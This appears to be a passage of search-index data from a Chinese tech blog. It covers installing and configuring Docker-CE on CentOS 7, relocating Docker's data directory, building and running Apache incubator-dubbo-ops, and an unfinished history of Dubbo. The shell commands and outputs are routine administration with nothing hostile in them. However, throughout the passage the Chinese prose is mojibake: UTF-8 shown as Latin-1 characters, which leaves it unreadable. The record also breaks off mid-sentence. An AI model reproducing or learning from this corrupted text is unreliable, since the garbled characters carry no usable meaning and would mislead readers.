Hubï¼Œå›½å†…çš„å…¬å¼€ä»“åº“æœ‰é˜¿é‡Œäº‘ã€ç½‘æ˜“äº‘ç­‰ Docker æ¶æ„å›¾ ä¸ºä»€ä¹ˆè¦åœ¨å¼€å‘ä¸­ä½¿ç”¨ Docker ä¸€è‡´çš„å¼€å‘ç¯å¢ƒï¼ŒDocker å¯ä»¥ä¿è¯æ•´ä¸ªç ”å‘å›¢é˜Ÿä½¿ç”¨ä¸€è‡´çš„å¼€å‘ç¯å¢ƒ åœ¨å¼€å‘æ—¶åªéœ€ Dockerï¼Œæ— éœ€åœ¨è‡ªå·±çš„å¼€å‘ä¸»æœºä¸Šæ­å»ºå„ç§ç¼–ç¨‹è¯­è¨€ç¯å¢ƒ ç®€åŒ–äº†ç¼–è¯‘å’Œæ„å»ºçš„å¤æ‚æ€§ï¼Œå¯¹äºä¸€äº›åŠ¨è¾„æ•°å°æ—¶çš„ç¼–è¯‘å’Œæ„å»ºå·¥ä½œï¼Œå¯ä»¥ç”¨ Docker æ¥ç®€åŒ– éƒ¨ç½²å¾ˆç®€å•ï¼Œåº”ç”¨ç¨‹åºåœ¨å®¹å™¨ä¸­è¿è¡Œï¼Œå¼€å‘ç¯å¢ƒä¸æœ€ç»ˆçš„ç”Ÿäº§ç¯å¢ƒä¿æŒä¸€è‡´ï¼Œè¿™å‡å°‘äº†éƒ¨ç½²å‡ºé”™çš„å¯èƒ½æ€§ å¯ä»¥ä½¿ç”¨åŒä¸€ç¼–ç¨‹è¯­è¨€ï¼ˆå¦‚ go, python, ruby, java, node ç­‰ï¼‰çš„å¤šä¸ªç‰ˆæœ¬ï¼Œæ— éœ€è§£å†³å¤šç‰ˆæœ¬å†²çªçš„é—®é¢˜ Docker æ‹¥æœ‰å‡ å¤§ç‰¹æ€§ï¼šæŒç»­é›†æˆã€ç‰ˆæœ¬æ§åˆ¶ã€å¯ç§»æ¤æ€§ã€éš”ç¦»æ€§å’Œå®‰å…¨æ€§ Docker å±äºè§£å†³è¿è¡Œç¯å¢ƒå’Œé…ç½®é—®é¢˜ï¼Œæ–¹ä¾¿åšæŒç»­é›†æˆï¼Œå¹¶æœ‰åŠ©äºæ•´ä½“å‘å¸ƒçš„å®¹å™¨è™šæ‹ŸåŒ–æŠ€æœ¯ Docker æä¾›æ›´å¿«é€Ÿçš„åº”ç”¨äº¤ä»˜å’Œéƒ¨ç½²ï¼Œæ›´ä¾¿æ·çš„å‡çº§å’Œæ‰©ç¼©å®¹ï¼Œæ›´ç®€å•çš„ç³»ç»Ÿè¿ç»´ï¼Œæ›´é«˜æ•ˆçš„è®¡ç®—èµ„æºåˆ©ç”¨ Docker å„ç‰ˆæœ¬å¯¹ Centos çš„å…¼å®¹ docker-ioï¼ˆæ—§ç‰ˆæœ¬ï¼‰ Centos7ï¼ˆ64-bitï¼‰ï¼ŒLinux å†…æ ¸ç‰ˆæœ¬ä¸º 3.10 ä»¥ä¸Š Centos6.5ï¼ˆ64-bitï¼‰æˆ–æ›´é«˜ç‰ˆæœ¬ï¼ŒLinux å†…æ ¸ç‰ˆæœ¬ä¸º 2.6.32-431 æˆ–æ›´é«˜ docker-ceï¼ˆæ–°ç‰ˆæœ¬ï¼‰ Centos7ï¼ˆ64-bitï¼‰ï¼ŒLinux å†…æ ¸ç‰ˆæœ¬ä¸º 3.10 ä»¥ä¸Š docker æ–°æ—§ç‰ˆæœ¬åç§°çš„åŒºåˆ« æ—§ç‰ˆæœ¬çš„åç§°æ˜¯ dockerã€docker-ioã€docker-engine æ–°ç‰ˆæœ¬çš„åç§°æ˜¯ docker-ceï¼ˆç¤¾åŒºç‰ˆï¼‰ã€docker-eeï¼ˆä¼ä¸šç‰ˆï¼‰ Centos7 å®‰è£… Docker-CE 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# æŸ¥çœ‹Centosç³»ç»Ÿç‰ˆæœ¬# cat /etc/redhat-releaseCentOS Linux release 7.6.1810 (Core)# æŸ¥çœ‹Linuxå†…æ ¸ç‰ˆæœ¬# uname -aLinux centos7 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux# å¸è½½æ—§ç‰ˆæœ¬çš„Dockerï¼Œå°†ä¿ç•™/var/lib/docker/çš„å†…å®¹ï¼ŒåŒ…æ‹¬é•œåƒã€å®¹å™¨ã€å­˜å‚¨å·å’Œç½‘ç»œ# yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine# å¦‚éœ€åˆ é™¤æ—§ç‰ˆæœ¬çš„æ‰€æœ‰é•œåƒã€å®¹å™¨å’Œå­˜å‚¨å·ï¼Œè¯·è¿è¡Œä¸‹åˆ—å‘½ä»¤# rm -rf /var/lib/docker# å®‰è£…æ‰€éœ€çš„è½¯ä»¶åŒ…# yum install yum-utils device-mapper-persistent-data lvm2# æ·»åŠ Dockerçš„é˜¿é‡Œäº‘yumé•œåƒä»“åº“ï¼ˆé»˜è®¤ä½¿ç”¨stableé•œåƒä»“åº“ï¼‰# yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo# æ›´æ–°yumè½¯ä»¶åŒ…ç´¢å¼•# yum makecache fast# æŸ¥è¯¢å¯å®‰è£…çš„Dockerç‰ˆæœ¬# yum list docker-ce.x86_64 --showduplicates | sort -rdocker-ce.x86_64 3:18.09.0-3.el7 docker-ce-stabledocker-ce.x86_64 18.06.1.ce-3.el7 docker-ce-stabledocker-ce.x86_64 18.06.0.ce-3.el7 docker-ce-stabledocker-ce.x86_64 18.03.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 18.03.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.12.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.12.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.09.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.09.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.06.2.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.06.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.06.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.03.3.ce-1.el7 docker-ce-stabledocker-ce.x86_64 17.03.2.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.03.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.03.0.ce-1.el7.centos docker-ce-stable# å®‰è£…æœ€æ–°ç‰ˆçš„Docker-CE# yum install docker-ce# æˆ–è€…å®‰è£…æŒ‡å®šç‰ˆæœ¬çš„Docker-CE# yum install docker-ce-18.06.1.ce-3.el7# å¯åŠ¨Docker# systemctl start docker# è®¾ç½®Dockerrå¼€æœºè‡ªå¯åŠ¨ï¼ˆéå¿…éœ€ï¼‰# systemctl enable docker# æŸ¥çœ‹å·²å®‰è£…çš„Dockerç‰ˆæœ¬# docker versionClient: Version: 18.09.0 API version: 1.39 Go version: go1.10.4 Git commit: 4d60db4 Built: Wed Nov 7 00:48:22 2018 OS/Arch: linux/amd64 Experimental: falseServer: Docker Engine - Community Engine: Version: 18.09.0 API version: 1.39 (minimum version 1.12) Go version: go1.10.4 Git commit: 4d60db4 Built: Wed Nov 7 00:19:08 2018 OS/Arch: linux/amd64 Experimental: false# éªŒè¯æ˜¯å¦æ­£ç¡®å®‰è£…äº†docker-ce# ä»¥ä¸‹å‘½ä»¤å°†ä¸‹è½½ä¸€ä¸ªæµ‹è¯•é•œåƒå¹¶åœ¨å®¹å™¨ä¸­è¿è¡Œå®ƒï¼Œå®¹å™¨è¿è¡Œæ—¶å°†è¾“å‡ºä¸€æ¡å‚è€ƒæ¶ˆæ¯å¹¶é€€å‡º# docker run hello-world Centos7 é…ç½® Docker-CE çš„é•œåƒåŠ é€Ÿ 123456789101112# åˆ›å»ºDockerçš„é…ç½®æ–‡ä»¶ç›®å½•# mkdir -p /etc/docker# åˆ›å»ºDockerçš„é…ç½®æ–‡ä»¶ï¼Œå¹¶æŒ‡å®šDockerçš„é•œåƒæºåœ°å€ï¼Œå…¶ä¸­æ³¨å†Œé˜¿é‡Œäº‘æˆ–è€…ç½‘æ˜“äº‘å¸å·åå¯ä»¥ä»é•œåƒæœåŠ¡ä¸­è·å–xxxxxxåºåˆ—å·ï¼Œå»ºè®®ä½¿ç”¨é˜¿é‡Œäº‘çš„é•œåƒæœåŠ¡# vim /etc/docker/daemon.json{"registry-mirrors": ["https://xxxxxx.mirror.aliyuncs.com"]}# åŠ è½½æ–°çš„é…ç½®# systemctl daemon-reload# é‡æ–°å¯åŠ¨Docker# systemctl restart docker Centos7 å¸è½½ Docker-CE 1234567# å¸è½½Docker-CEå®‰è£…åŒ…ï¼Œä¸»æœºä¸Šçš„é•œåƒã€å®¹å™¨ã€å­˜å‚¨å·ã€æˆ–å®šåˆ¶é…ç½®æ–‡ä»¶ä¸ä¼šè‡ªåŠ¨åˆ é™¤# yum remove docker-ce# å¦‚éœ€åˆ é™¤æ‰€æœ‰é•œåƒã€å®¹å™¨å’Œå­˜å‚¨å·ï¼Œè¯·è¿è¡Œä¸‹åˆ—å‘½ä»¤# rm -rf /var/lib/docker# æ‰‹åŠ¨åˆ é™¤ä»»ä½•å·²ç¼–è¾‘çš„Dockeré…ç½®æ–‡ä»¶ æ›´æ”¹ Docker é»˜è®¤å®‰è£…è·¯å¾„ å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¦‚æœå·²ç»å­˜åœ¨å¤§é‡ Docker å®¹å™¨ï¼Œæ›´æ”¹ Docker çš„é»˜è®¤å®‰è£…è·¯å¾„å­˜åœ¨æ•°æ®ä¸¢å¤±çš„é£é™©ï¼Œè¯·æå‰å¤‡ä»½é‡è¦çš„æ•°æ®ï¼å»ºè®®ä½¿ç”¨ä¸‹é¢ä»‹ç»çš„ç¬¬äºŒç§æ–¹æ³•è¿›è¡Œæ“ä½œï¼Œå› ä¸ºç¬¬ä¸€ç§æ–¹æ³•å­˜åœ¨å‡çº§é—®é¢˜ï¼Œé‚£å°±æ˜¯å½“ Docker çš„ç‰ˆæœ¬å‡çº§åï¼Œdocker.service é…ç½®æ–‡ä»¶çš„å†…å®¹ä¼šè¢«è¦†ç›–æ‰ã€‚ 12345678910111213141516171819202122# æ–¹æ³•ä¸€ï¼ˆé€šè¿‡Dockerç³»ç»ŸæœåŠ¡çš„é…ç½®æ–‡ä»¶æŒ‡å®šå®‰è£…ç›®å½•è·¯å¾„ï¼‰# åœæ­¢Docker# systemctl stop docker# å°†åŸå®‰è£…ç›®å½•ç§»åŠ¨åˆ°æ–°å®‰è£…ç›®å½•ï¼Œä¾‹å¦‚ç§»åŠ¨è‡³/home/docker# æ³¨æ„ï¼Œè¿™é‡Œå³ä½¿ä¸ç§»åŠ¨åŸå®‰è£…ç›®å½•ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ˆDockerä¼šåœ¨æ–°ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºç›¸å…³æ–‡ä»¶ï¼‰ï¼Œåªæ˜¯ä¸ç§»åŠ¨çš„è¯ä»¥å‰çš„é•œåƒã€å®¹å™¨æ•°æ®å°±ä¼šä¸¢å¤±# mv /var/lib/docker /home# ä¿®æ”¹docker.serviceæ–‡ä»¶ï¼Œåœ¨å¯åŠ¨Dockerçš„æ—¶å€™ï¼Œé€šè¿‡--graphå‚æ•°æŒ‡å®šæ–°å®‰è£…ç›®å½•çš„è·¯å¾„# vim /usr/lib/systemd/system/docker.serviceExecStart=/usr/bin/dockerd -H unix:// --graph /home/docker# ä½¿é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ# systemctl daemon-reload# å¯åŠ¨Docker# systemctl start docker# æŸ¥çœ‹Dockeré»˜è®¤å®‰è£…ç›®å½•æ˜¯å¦æ›´æ”¹äº†# docker infoDocker Root Dir: /home/docker 12345678910111213# æ–¹æ³•äºŒï¼ˆé€šè¿‡å»ºç«‹è½¯é“¾æ¥ï¼Œå°†æ—§çš„å®‰è£…ç›®å½•/var/lib/dockeré‡å®šå‘åˆ°æ–°çš„å®‰è£…ç›®å½•/home/dockerï¼Œè¿™æ ·å°±å¯ä»¥é¿å…ä¿®æ”¹docker.serviceæ–‡ä»¶ï¼‰# åœæ­¢Docker# systemctl stop docker# ç§»åŠ¨ç›®å½•# mv /var/lib/docker /home# åˆ›å»ºè½¯é“¾æ¥# ln -s /home/docker /var/lib/docker# å¯åŠ¨Docker# systemctl start docker 12345678# éªŒè¯Dockerçš„é»˜è®¤å®‰è£…è·¯å¾„æ›´æ”¹åï¼Œæ˜¯å¦å¯ä»¥æ­£å¸¸å·¥ä½œ# æŸ¥çœ‹åå°è¿›ç¨‹# ps -aux|grep docker# æµ‹è¯•æ˜¯å¦è¿ç§»æˆåŠŸ# docker pull centos# docker run -it centos Docker ç›¸å…³æ–‡ä»¶ä»‹ç» 123Dockeré»˜è®¤å®‰è£…ç›®å½•ï¼š/var/lib/dockerDockeré…ç½®æ–‡ä»¶ï¼š /etc/docker/daemon.jsonDockerç³»ç»ŸæœåŠ¡çš„é…ç½®æ–‡ä»¶ï¼š /usr/lib/systemd/system/docker.service å…¶ä»– Linux å‘è¡Œç‰ˆå®‰è£… Docker-CE Debian å®‰è£… Docker-CE Ubuntu å®‰è£… Docker-CE Fedora å®‰è£… Docker-CE var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Dubbo ä¹‹ä¸‰ Dubbo ç®¡ç†ä¸ç›‘æ§ä¸­å¿ƒçš„å®‰è£…",url:"/posts/d70c90c.html",text:'Github é¡¹ç›®åœ°å€ Incubator Dubbo Ops Github å‰è¨€ ä¸ä»¥å‰ç›¸æ¯”ï¼ŒIncubator Dubbo Ops é¡¹ç›®ä¸­ master åˆ†æ”¯çš„ä»£ç è¿›è¡Œäº†å¤§é‡é‡æ„ï¼Œé‡æ„ä¹‹åçš„ä»£ç ç›®å‰åœ¨ develop åˆ†æ”¯ï¼›åŒæ—¶ develop åˆ†æ”¯çš„éƒ¨ç½²æ–¹å¼å‘ç”Ÿäº†ä¸å°‘å˜åŒ–ï¼Œä¸»è¦ä½“ç°åœ¨ develop åˆ†æ”¯é‡‡ç”¨äº†å‰åç«¯åˆ†ç¦»çš„éƒ¨ç½²æ–¹å¼ï¼Œä¸‹é¢å°†ä¼šåˆ†åˆ«è¯¦ç»†ä»‹ç» master ä¸ develop åˆ†æ”¯å…·ä½“çš„éƒ¨ç½²æ–¹å¼ã€‚æ­¤æ•™ç¨‹çš„åˆ›å»ºæ—¥æœŸä¸º 2018-12-20ï¼Œç”±äºå®˜æ–¹é¡¹ç›®æ­£åœ¨ä¸æ–­è¿­ä»£å¼€å‘ä¸­ï¼Œå› æ­¤æ­¤æ•™ç¨‹åœ¨æ—¥åå¯èƒ½ä¸å®˜æ–¹çš„æœ€æ–°ä»£ç ä¸åŒæ­¥ï¼Œä¸€åˆ‡ä»¥å®˜æ–¹çš„ Github è¯´æ˜æ–‡æ¡£ä¸ºå‡†ã€‚ incubator-dubbo-ops master åˆ†æ”¯ï¼ˆæˆªæ­¢ 2018-12-20ï¼‰ é¡¹ç›®è¯´æ˜ é¡¹ç›®æ˜¯æ ‡å‡†çš„ Spring Boot å·¥ç¨‹ ä¸»çº¿ä»£ç å·²ç»è¿›è¡Œäº†é‡æ„ï¼Œå®˜æ–¹å»ºè®®ä½¿ç”¨ develop åˆ†æ”¯ æ„å»ºå‡†å¤‡ æœ¬åœ°å®‰è£…å¹¶å¯åŠ¨ Zookeeper æœåŠ¡ç«¯ æœ¬åœ°å®‰è£… Mavenï¼Œå¹¶é…ç½® Maven çš„ç¯å¢ƒå˜é‡ æ„å»ºæ­¥éª¤ 1234567891011121314151617181920# å…‹éš†masteråˆ†æ”¯çš„ä»£ç # git clone -b master https://github.com/apache/incubator-dubbo-ops.git# ä»£ç çš„ç›®å½•ç»“æ„incubator-dubbo-ops-masterâ”œâ”€â”€ dubbo-adminâ”œâ”€â”€ dubbo-monitor-simpleâ”œâ”€â”€ dubbo-registry-simpleâ”œâ”€â”€ pom.xmlâ””â”€â”€ README.md# è¿›å…¥é¡¹ç›®æ ¹ç›®å½•$ cd incubator-dubbo-ops-master# ä¿®æ”¹æ³¨å†Œä¸­å¿ƒåœ°å€$ vim dubbo-admin/src/main/resources/application.propertiesdubbo.registry.address=zookeeper://127.0.0.1:2181# ä½¿ç”¨mavenå‘½ä»¤è¿›è¡Œæ‰“åŒ…$ mvn clean package æ„å»ºç»“æœ åœ¨ incubator-dubbo-ops-master/dubbo-admin/target ç›®å½•ä¸­ç”Ÿæˆ dubbo-admin-0.0.1-SNAPSHOT.jar åœ¨ incubator-dubbo-ops-master/dubbo-monitor-simple/target ç›®å½•ä¸­ç”Ÿæˆ dubbo-monitor-simple-2.0.0-assembly.tar.gzï¼Œè§£å‹ç¼©åå¯ä»¥æ‰¾åˆ°ç”¨äºå¯åŠ¨æˆ–åœæ­¢ç›‘æ§çš„ shell è„šæœ¬ã€‚ åœ¨ incubator-dubbo-ops-master/dubbo-registry-simple/target ç›®å½•ä¸­ dubbo-registry-simple-2.0.0-assembly.tar.gzï¼Œè§£å‹ç¼©åå¯ä»¥æ‰¾åˆ°ç”¨äºå¯åŠ¨æˆ–åœæ­¢æ³¨å†Œçš„ shell è„šæœ¬ã€‚ è¿è¡Œ dubbo-adminï¼ˆå›¾å½¢åŒ–çš„æœåŠ¡ç®¡ç†åå°ï¼‰ 1234567891011121314# è¿›å…¥æ„å»ºç›®æ ‡ç›®å½•$ cd incubator-dubbo-ops-master/dubbo-admin/target# å‰å°è¿è¡Œ$ java -jar dubbo-admin-0.0.1-SNAPSHOT.jar# æˆ–è€…åå°è¿è¡Œ$ nohup java -jar dubbo-admin-0.0.1-SNAPSHOT.jar &amp;# æµè§ˆå™¨è®¿é—®ï¼Œç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç å‡ä¸ºguesthttp://127.0.0.1:7001# åœæ­¢è¿è¡Œ$ sudo pkill -9 java dubbo-adminï¼ˆå›¾å½¢åŒ–çš„æœåŠ¡ç®¡ç†åå°ï¼‰Web ç•Œé¢ è¿è¡Œ dubbo-monitor-simpleï¼ˆå›¾å½¢åŒ–çš„ç›‘æ§åå°ï¼‰ 123456789101112131415161718# è¿›å…¥æ„å»ºç›®æ ‡ç›®å½•$ cd incubator-dubbo-ops-master/dubbo-monitor-simple/target# è§£å‹æ–‡ä»¶$ tar -xvf dubbo-monitor-simple-2.0.0-assembly.tar.gz# ä¿®æ”¹æ³¨å†Œä¸­å¿ƒåœ°å€$ vim dubbo-monitor-simple-2.0.0/conf/dubbo.propertiesdubbo.registry.address=zookeeper://127.0.0.1:2181# è¿è¡ŒæœåŠ¡ï¼ˆé»˜è®¤åå°è¿è¡Œï¼‰$ ./dubbo-monitor-simple-2.0.0/assembly.bin/start.sh# æµè§ˆå™¨è®¿é—®http://127.0.0.1:8080# åœæ­¢æœåŠ¡$ ./dubbo-monitor-simple-2.0.0/assembly.bin/stop.sh dubbo-monitor-simpleï¼ˆå›¾å½¢åŒ–çš„ç›‘æ§åå°ï¼‰Web ç•Œé¢ è§£å†³ Spring åº”ç”¨æ·»åŠ  &lt;dubbo:monitor protocol=â€registryâ€/&gt; é…ç½®åï¼Œæ— æ³•è¿æ¥ dubbo-monitor çš„é—®é¢˜ 123# é…ç½®æœ¬æœºipv4çš„ip + ç”¨æˆ·ä¸»æœºåï¼Œå³æ·»åŠ å¦‚ä¸‹ä¸€è¡Œå†…å®¹ï¼Œå°†å…¶ä¸­çš„xxxæ›¿æ¢ä¸ºæœ¬æœºçœŸå®çš„IPåœ°å€ï¼Œä¾‹å¦‚192.168.1.198$ sudo vim /etc/hostsxxx.xxx.xxx.xxx centos7 incubator-dubbo-ops develop åˆ†æ”¯ï¼ˆæˆªæ­¢ 2019-02-23ï¼‰ å‰ç«¯è¯´æ˜ ä¾èµ– NPM è¿›è¡Œç®¡ç†å’Œæ„å»º ä½¿ç”¨ Vue.js ä½œä¸º Javascript æ¡†æ¶ï¼ŒVuetify ä½œä¸º UI æ¡†æ¶ åœ¨å¼€å‘ç¯å¢ƒä¸­ï¼Œå¯ä»¥æŒ‰ç…§æ­¤æ–‡æ¡£çš„æ­¥éª¤è¿›è¡Œæ„å»º é‡‡ç”¨å‰åç«¯åˆ†ç¦»çš„éƒ¨ç½²æ–¹å¼ï¼Œå‰ç«¯æ”¯æŒçƒ­åŠ è½½ï¼Œä»»ä½•é¡µé¢çš„ä¿®æ”¹éƒ½å¯ä»¥å®æ—¶åé¦ˆï¼Œä¸éœ€è¦é‡å¯åº”ç”¨ åç«¯è¯´æ˜ é¡¹ç›®æ˜¯æ ‡å‡†çš„ Spring Boot å·¥ç¨‹ï¼Œå¯ä»¥åœ¨ä»»ä½• Java IDE ä¸­è¿è¡Œ æ”¯æŒ Swaggerï¼Œéƒ¨ç½²å®Œæˆåå¯ä»¥è®¿é—® http://localhost:8080/swagger-ui.html æ¥æŸ¥çœ‹æ‰€æœ‰çš„ Restful API æ„å»ºå‡†å¤‡ æœ¬åœ°å®‰è£…å¹¶å¯åŠ¨ Zookeeper æœåŠ¡ç«¯ æœ¬åœ°å®‰è£… Mavenï¼Œå¹¶é…ç½® Maven çš„ç¯å¢ƒå˜é‡ æœ¬åœ°å®‰è£… NodeJSï¼Œå¹¶é…ç½® NodeJS çš„ç¯å¢ƒå˜é‡ï¼ˆéå¿…éœ€ï¼ŒMaven æ’ä»¶ä¼šè‡ªåŠ¨å®‰è£… NodeJSï¼‰ æ„å»ºæ­¥éª¤ 123456789101112131415161718192021222324252627282930# å…‹éš†developåˆ†æ”¯çš„ä»£ç $ git clone -b develop https://github.com/apache/incubator-dubbo-ops.git# ä»£ç ç›®å½•ç»“æ„incubator-dubbo-opsâ”œâ”€â”€ codestyleâ”œâ”€â”€ DISCLAIMERâ”œâ”€â”€ docâ”œâ”€â”€ dubbo-admin-distributionâ”œâ”€â”€ dubbo-admin-serverâ”œâ”€â”€ dubbo-admin-uiâ”œâ”€â”€ LICENSEâ”œâ”€â”€ mvnwâ”œâ”€â”€ mvnw.cmdâ”œâ”€â”€ NOTICEâ”œâ”€â”€ pom.xmlâ”œâ”€â”€ README.mdâ””â”€â”€ README_ZH.md# è¿›å…¥é¡¹ç›®æ ¹ç›®å½•$ cd incubator-dubbo-ops# ä¿®æ”¹æ³¨å†Œä¸­å¿ƒåœ°å€ï¼Œæ›´å¤šé…ç½®å¯å‚è€ƒï¼šhttps://github.com/apache/incubator-dubbo-ops/wiki/Dubbo-Admin%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E$ vim dubbo-admin-server/src/main/resources/application.propertiesadmin.registry.address=zookeeper://127.0.0.1:2181admin.config-center=zookeeper://127.0.0.1:2181admin.metadata-report.address=zookeeper://127.0.0.1:2181# ä½¿ç”¨mavenå‘½ä»¤è¿›è¡Œæ‰“åŒ…$ mvn clean package è¿è¡Œ dubbo-admin-serverï¼ˆå›¾å½¢åŒ–çš„æœåŠ¡ç®¡ç†åå°ï¼‰ 12345678# è¿›å…¥ç›®å½•$ cd incubator-dubbo-ops# é€šè¿‡mavenæ’ä»¶è¿è¡Œåº”ç”¨$ mvn --projects dubbo-admin-server spring-boot:run# æµè§ˆå™¨æµ‹è¯•è®¿é—®http://localhost:8080 dubbo-admin-serverï¼ˆå›¾å½¢åŒ–çš„æœåŠ¡ç®¡ç†åå°ï¼‰Web ç•Œé¢ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼ linux"},{title:"Dubbo ä¹‹äºŒ Dubbo å‘å±•å†ç¨‹",url:"/posts/48ccc519.html",text:'ç›¸å…³ç«™ç‚¹ incubator-dubbo github incubator-dubbo docs incubator-dubbo-spring-boot-project github dubbo github dubbo å‘¨è¾¹ç”Ÿæ€ RPC ä»‹ç» RPC æ ¸å¿ƒæ¨¡å—ï¼š é€šè®¯ã€åºåˆ—åŒ– ä¸»æµ RPC æ¡†æ¶ï¼š Dubboã€gRPCã€Thriftã€HSFã€Motanã€ZBUS Dubbo å‘å±•å†ç¨‹ 2011 å¹´ 10 æœˆ 27 æ—¥ï¼Œé˜¿é‡Œå·´å·´å¼€æºäº†è‡ªå·±çš„ SOA æœåŠ¡åŒ–æ²»ç†æ–¹æ¡ˆçš„æ ¸å¿ƒæ¡†æ¶ Dubboã€‚ 2012 å¹´ 10 æœˆ 23 æ—¥å‘å¸ƒ Dubbo2.5.3 ç‰ˆæœ¬ï¼Œè‡³æ­¤ä¹‹åï¼Œé˜¿é‡ŒåŸºæœ¬åœæ­¢äº†å¯¹ Dubbo çš„ä¸»è¦å‡çº§ï¼›åªåœ¨ 2013 å¹´å’Œ 2014 å¹´æ›´æ–°è¿‡ 2 æ¬¡å¯¹ Dubbo2.4 çš„ç»´æŠ¤ç‰ˆæœ¬ï¼Œç„¶ååœæ­¢äº†æ‰€æœ‰ç»´æŠ¤å·¥ä½œï¼›åŒæ—¶ Dubbo å¯¹ Srping çš„æ”¯æŒä¹Ÿåœç•™åœ¨äº† Spring 2.5.6 ç‰ˆæœ¬ä¸Šã€‚åœ¨é˜¿é‡Œåœæ­¢ç»´æŠ¤å’Œå‡çº§ Dubbo æœŸé—´ï¼Œå½“å½“ç½‘å¼€å§‹ç»´æŠ¤è‡ªå·±çš„ Dubbo åˆ†æ”¯ç‰ˆæœ¬ Dubboxï¼Œæ”¯æŒäº†æ–°ç‰ˆæœ¬çš„ Springï¼Œå¹¶å¯¹å¤–å¼€æºäº† Dubboxã€‚è€Œç½‘æ˜“è€ƒæ‹‰ä¹Ÿç»´æŠ¤äº†è‡ªå·±çš„ç‹¬ç«‹åˆ†æ”¯ Dubbokï¼Œå¯æƒœå¹¶æœªå¯¹å¤–å¼€æºã€‚ 2017 å¹´ 9 æœˆ 7 æ—¥å‘å¸ƒ Dubbo çš„ 2.5.4 ç‰ˆæœ¬ï¼Œè·ç¦»ä¸Šä¸€ä¸ªç‰ˆæœ¬ 2.5.3 å‘å¸ƒå·²ç»æ¥è¿‘å¿« 5 å¹´æ—¶é—´äº†ã€‚åœ¨éšåçš„å‡ ä¸ªæœˆä¸­ï¼Œé˜¿é‡Œ Dubbo å¼€å‘å›¢é˜Ÿä»¥å·®ä¸å¤šæ¯æœˆä¸€ç‰ˆæœ¬çš„é€Ÿåº¦å¼€å§‹å¿«é€Ÿå‡çº§è¿­ä»£ï¼Œä¿®è¡¥äº† Dubbo è€ç‰ˆæœ¬å¤šå¹´æ¥å­˜åœ¨çš„è¯¸å¤š bugï¼Œå¹¶å¯¹ Spring ç­‰ç»„ä»¶çš„æ”¯æŒè¿›è¡Œäº†å…¨é¢å‡çº§ã€‚ 2018 å¹´ 1 æœˆ 8 æ—¥å‘å¸ƒ Dubbo 2.6.0 ç‰ˆæœ¬ï¼Œæ–°ç‰ˆæœ¬å°†ä¹‹å‰å½“å½“ç½‘å¼€æºçš„ Dubbo åˆ†æ”¯ Dubbox è¿›è¡Œäº†åˆå¹¶ï¼Œå®ç°äº† Dubbo ç‰ˆæœ¬çš„ç»Ÿä¸€æ•´åˆã€‚ 2018 å¹´ 1 æœˆ 8 æ—¥ï¼ŒDubbo åˆ›å§‹äººä¹‹ä¸€æ¢é£åœ¨ Dubbo äº¤æµç¾¤é‡Œé€éœ²äº† Dubbo 3.0 æ­£åœ¨åŠ¨å·¥çš„æ¶ˆæ¯ã€‚Dubbo 3.0 å†…æ ¸ä¸ Dubbo2.0 å®Œå…¨ä¸åŒï¼Œä½†å…¼å®¹ Dubbo 2.0ã€‚Dubbo 3.0 å°†ä»¥ Streaming ä¸ºå†…æ ¸ï¼Œä¸å†æ˜¯ Dubbo æ—¶ä»£çš„ RPCï¼Œä½†æ˜¯ RPC ä¼šåœ¨ Dubbo3.0 ä¸­å˜æˆè¿œç¨‹ Streaming å¯¹æ¥çš„ä¸€ç§å¯é€‰å½¢æ€ã€‚Dubbo 3.0 å°†æ”¯æŒå¯é€‰ Service Meshï¼Œå¤šåŠ ä¸€å±‚ 